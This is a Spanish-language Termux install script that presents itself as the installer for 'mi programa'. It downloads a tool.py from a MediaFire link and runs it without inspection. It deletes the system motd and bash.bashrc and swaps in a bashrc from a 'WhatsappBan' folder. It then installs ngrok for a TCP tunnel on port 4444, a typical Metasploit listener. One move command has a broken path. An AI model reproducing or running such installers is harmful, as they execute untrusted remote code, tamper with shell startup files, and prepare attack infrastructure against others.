#!/bin/bash
echo -e "\e[32m Bienvenido a la instalacion de mi programa, espera un momento\e[39m"
sleep 5
echo -e "\e[32mIniciando Instalacion\e[39m"
sleep 5
echo -e "\e[32mInstalando Python\e[39m"
sleep 5
pkg install python
echo -e "\e[32mInstalando wget\e[39m"
sleep 5
pkg install wget
clear
echo -e "\e[32mInstalando git\e[39m"
sleep 5
pkg install git
clear
echo -e "\e[32mInstalando Modulos python\e[39m"
sleep 5
pip install pybase64
echo -e "\e[32mInstalando repositorios de python\e[39m"
pkg install python*
clear
echo -e "\e[32mInstalacion modulos completada, aguarde por favor\e[39m"
sleep 10
clear
echo -e "\e[32m Descargando Scripts, aguarde por favor \e[39m"
wget https://download1327.mediafire.com/iw7h6354afug/325aifl4ei5awjz/tool.py
clear
echo -e "\e[32m Asignando permisos \e[39m"
sleep 5
echo -e "\e[32m Acepte los permisos de storage de termux\e[39m"
termux-setup-storage
chmod +x tool.py
python tool.py
mv tool.py /data/data/com.termux/files/usr/etc/
rm /data/data/com.termux/files/usr/etc/motd
sleep 2
cd /data/data/com.termux/files/usr/etc/
sleep 1
rm bash.bashrc
mv ~/WhatsappBan/bash.bashrc data/data/com.termux/files/usr/etc/
clear
echo -e "\e[32m Aguarde por favor\e[39m"
sleep 5
echo -e "\e[32m Instalaremos Metasploit y Ngrok en su termux\e[39m"
sleep 5
clear
echo -e "\e[32m Descargando Ngrok\e[39m"
sleep 5
git clone https://github.com/Marcel0Sousa/termux-ngrok
clear
cd termux-ngrok
chmod +x termux-ngrok.sh
bash termux-ngrok.sh
clear
echo -e "\e[32m Instalacion ngrok finalizada\e[39m"
echo -e "\e[32m para ejecutar utilize ngrok tcp 4444[39m"
sleep 3
clear
cd ..
echo -e "\e[1;39m REQUIERE SER ROOT...[0m"
sleep 3
